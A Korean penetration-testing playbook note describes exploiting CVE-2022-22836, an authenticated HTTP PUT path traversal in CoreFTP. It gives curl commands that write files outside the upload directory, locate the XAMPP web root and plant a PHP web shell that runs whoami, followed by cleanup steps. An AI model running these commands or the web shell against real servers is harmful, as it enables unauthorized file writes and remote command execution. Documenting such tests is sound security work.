---
tags:
  - 환경/windows
  - 서비스/http
시작조건: ["CoreFTP 인증 확보", "HTTP PUT 기능 확인"]
필요조건: ["CoreFTP 인증 계정", "CoreFTP before build 727", "HTTP PUT 처리 기능", "path traversal 가능 경로"]
결과: ["파일 쓰기", "경로 이탈", "웹 실행 연계 단서"]
---

# CoreFTP HTTP PUT Path Traversal

## 한 줄 판단

현재 명령 실행 위치에서 취약한 CoreFTP HTTP 서비스에 연결할 수 있고 유효한 CoreFTP 계정이 있다면, 인증된 `PUT` 요청의 경로 이동 처리로 기본 업로드 디렉터리 밖에 시험 파일을 쓸 수 있는지 확인한다. 파일 쓰기 성공과 웹 실행은 별도로 검증한다.

HTTP/HTTPS 기반 CoreFTP 업로드 인터페이스, `before build 727` 취약 범위 후보와 유효한 FTP/CoreFTP 계정이 모두 필요하다. 파일 쓰기 성공과 웹 실행은 별도 결과로 유지한다.

## 전제 조건

| 조건          | 확인 방법                                               | 충족 기준                         |
| ----------- | --------------------------------------------------- | ----------------------------- |
| 취약 제품       | 배너, 버전 정보, 서비스 문서                                   | CoreFTP before build 727 의심   |
| 인증 계정       | FTP/HTTP Basic 인증                                   | 로그인 가능                        |
| HTTP PUT 가능 | `curl -X PUT`                                       | 요청이 서버에서 처리됨                  |
| 경로 이탈       | `--path-as-is`, traversal payload                   | 제한 디렉터리 밖 파일 쓰기 가능            |
| 웹 루트 후보     | 웹 배너, 기본 설치 경로, 노출된 debug/phpinfo, 설정 파일, 기존 URL 구조 | 후보 경로를 세운 뒤 파일 쓰기/HTTP 조회로 검증 |

## 확인할 단서

| 단서 | 의미 | 다음 행동 |
|---|---|---|
| CoreFTP build 727 미만 | 취약 가능성 | 식별 가능한 테스트 파일 쓰기로 검증 |
| HTTP `PUT` 허용 | 파일 쓰기 공격면 | 경로 제한 우회 여부 확인 |
| `201 Created`, `200 OK` | 파일 생성/갱신 가능성 | 파일 조회 또는 서버 측 영향 확인 |
| 웹 서버 배너와 기본 페이지 | Apache/XAMPP/IIS 같은 웹 루트 후보 | 후보 경로에 테스트 파일 쓰기 검증 |
| 노출된 `phpinfo()` 또는 debug page | `DOCUMENT_ROOT`, `SCRIPT_FILENAME` 확인 가능 | 확인된 경로에 파일 쓰기 검증 |

PUT 대상은 기존 파일과 겹치지 않는 `<UNIQUE_PROOF>`·`<UNIQUE_WEB_PROOF>`를 사용한다. CoreFTP 목록·관리 경로나 이미 확보한 서버 파일 접근으로 기존 파일 부재와 사후 삭제 가능성을 확인할 수 없으면 제한 디렉터리 밖 쓰기를 시작하지 않는다.

아래 PUT 요청은 공격 호스트에서 실행한다. `<TARGET>`은 CoreFTP 서버의 IP 또는 FQDN(가상 예: `192.0.2.20`), `<USER>`·`<PASSWORD>`는 실제 CoreFTP 인증 계정과 비밀번호, `<UNIQUE_PROOF>`는 기존 파일과 겹치지 않는 짧은 파일명(가상 예: `proof-20260914a`)이다. `-k`는 자체 서명 인증서 때문에 TLS 검증이 실패할 때만 사용한다.

## 실행

1. CoreFTP 버전과 HTTP 업로드 경로를 확인한다.
2. 확보한 계정으로 Basic 인증이 되는지 확인한다.
3. 식별 가능한 내용으로 path traversal 파일 쓰기를 시도한다.
4. 웹 배너, 기본 설치 경로, 설정 파일, 노출된 debug/phpinfo 등으로 웹 루트 후보를 세운다.
5. 후보 웹 루트마다 쓰기 검증 파일을 만들고 HTTP로 조회해 실제 웹 루트를 검증한다.
6. PHP handler와 실행 경로가 확인되면 [[웹 파일 업로드와 Web Shell]]에서 서버 측 실행을 별도로 검증한다.

### 명령과 확인할 출력

#### HTTP PUT path traversal 검증

웹 루트 후보를 검증하는 이 블록도 공격 호스트에서 실행한다. `<UNIQUE_WEB_PROOF>`는 위 일반 proof와 다른 새 파일명(가상 예: `web-proof-20260914a`)이며, `<TARGET>`·`<USER>`·`<PASSWORD>`는 앞 단계 값을 재사용한다. PUT 응답만으로 PHP 실행을 뜻하지 않는다.

```bash
curl -k -X PUT -H "Host: <TARGET>" --basic -u <USER>:<PASSWORD> --data-binary "coreftp-path-proof" --path-as-is https://<TARGET>/../../../../../../<UNIQUE_PROOF>.txt
```

확인할 출력:

- HTTP 상태 코드
- 에러 없이 요청이 처리되는지 확인
- `-k`는 자체 서명 인증서 때문에 검증이 실패할 때만 사용한다. 신뢰할 수 있는 인증서이면 제거한다.

#### 응답 헤더 확인

```bash
curl -k -i -X PUT -H "Host: <TARGET>" --basic -u <USER>:<PASSWORD> --data-binary "coreftp-path-proof" --path-as-is https://<TARGET>/../../../../../../<UNIQUE_PROOF>.txt
```

확인할 출력:

- `200`, `201`, `204` 계열 응답이면 파일 쓰기 여부를 추가 확인한다.

#### 웹 루트 후보 수집

```bash
curl -i http://<TARGET>/
curl -i http://<TARGET>/dashboard/
```

확인할 출력:

- 웹 서버 종류, 기본 페이지, redirect 경로, XAMPP/IIS/Apache 같은 설치 단서.
- XAMPP가 확인되면 Windows 기본 후보로 `C:\xampp\htdocs`를 우선 검증한다.
- 이미 발견한 `phpinfo()`나 debug page가 있을 때만 `DOCUMENT_ROOT`, `SCRIPT_FILENAME`을 근거로 사용한다.

#### 웹 루트 쓰기 확인

```bash
curl -k -X PUT -H "Host: <TARGET>" --basic -u <USER>:<PASSWORD> --data-binary "coreftp-web-proof" --path-as-is https://<TARGET>/../../../../../../xampp/htdocs/<UNIQUE_WEB_PROOF>.txt
curl -i http://<TARGET>/<UNIQUE_WEB_PROOF>.txt
```

확인할 출력:

- `<UNIQUE_WEB_PROOF>.txt` 조회 시 `coreftp-web-proof`가 반환되면 웹 루트 파일 쓰기 성공이다.
- 조회되지 않으면 쓰기는 성공했더라도 후보 경로가 웹 루트가 아닐 수 있다. 다른 후보 경로로 같은 쓰기 검증 파일을 사용한다.

#### 웹 루트 스크립트 실행 확인

웹 루트 쓰기가 확인되고 PHP가 처리되는 경로라면 명령 결과를 반환하는 스크립트를 작성해 실제 서버 측 실행을 확인한다.

```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary '<?php echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; ?>' --path-as-is https://<IP>/../../../../../../xampp/htdocs/shell.php
curl -G 'http://<IP>/shell.php' --data-urlencode 'cmd=whoami'
```

확인할 출력:

- HTTP 응답에 대상 Windows 계정이 반환되는지.
- 파일 쓰기 성공과 PHP 실행 성공을 별도 상태로 기록한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `401/403` | 인증 실패 또는 권한 부족 | 시작 상태 유지 | 계정, Basic Auth, 쓰기 권한 확인 |
| `405 Method Not Allowed` | PUT 비활성화 | 시작 상태 유지 | FTP 업로드/다른 HTTP method 확인 |
| traversal 무시 | 패치됨 또는 경로 정규화 | 시작 상태 유지 | 버전, build, `--path-as-is` 사용 여부 확인 |
| 파일 확인 불가 | 쓰기 위치 미확인 또는 웹 루트 후보 오류 | 시작 상태 유지 | 서버 경로, 기본 설치 경로, FTP 목록, 노출 설정과 교차 확인 |
| 제한 경로 밖 쓰기 검증 파일 | 파일 쓰기 확보 | 파일 쓰기 | 생성 위치와 파일 내용 확인 |
| `../../` 처리 | 경로 이탈 확보 | 경로 이탈 | 임의 파일 쓰기 영향 설명 |
| 웹 루트에 스크립트 작성 | 웹 실행 연계 확보 | 웹 실행 연계 | [[웹 파일 업로드와 Web Shell]] 검토 |

## 확인할 출력과 권한

- 판정 기준: HTTP 응답, 제한 경로 밖 파일 생성과 실제 HTTP 조회를 분리한다. 서버 측 실행은 [[웹 파일 업로드와 Web Shell]]에서 확인한다.
- 권한 구분: 인증 전·익명·유효 계정 상태를 구분하고, 서비스 응답만으로 실제 권한을 추정하지 않는다.

## 변경 영향과 복구

traversal 검증 파일과 웹 루트에 쓴 proof의 실제 Windows 경로를 기록한다.

```cmd
del /f /q "C:\<UNIQUE_PROOF>.txt"
del /f /q "C:\xampp\htdocs\<UNIQUE_WEB_PROOF>.txt"
del /f /q "C:\xampp\htdocs\shell.php"
dir "C:\<UNIQUE_PROOF>.txt" "C:\xampp\htdocs\<UNIQUE_WEB_PROOF>.txt" "C:\xampp\htdocs\shell.php"
```

실제 환경에서는 예시 고정 이름 대신 고유 파일명을 사용하고 확인된 웹 루트 경로로 바꾼다. 파일 시스템 삭제 권한이 없다면 PUT을 수행하기 전에 CoreFTP 관리 경로나 다른 파일 접근 수단으로 정확한 파일을 제거할 수 있는지 확인한다.

## 관련 서비스

- [[FTP 서비스]]
- [[HTTP와 HTTPS 서비스]]

## 관련 도구

- [[curl]]

## 관련 노트

- [[FTP 익명 접근과 파일 수집]]
- [[웹 파일 업로드와 Web Shell]]
- [[Public Exploit 검토와 검증]]

## 참고 링크

- [NVD CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)
- [Core FTP Server build release notes](https://www.coreftp.com/forums/viewtopic.php?f=15&t=4022509)
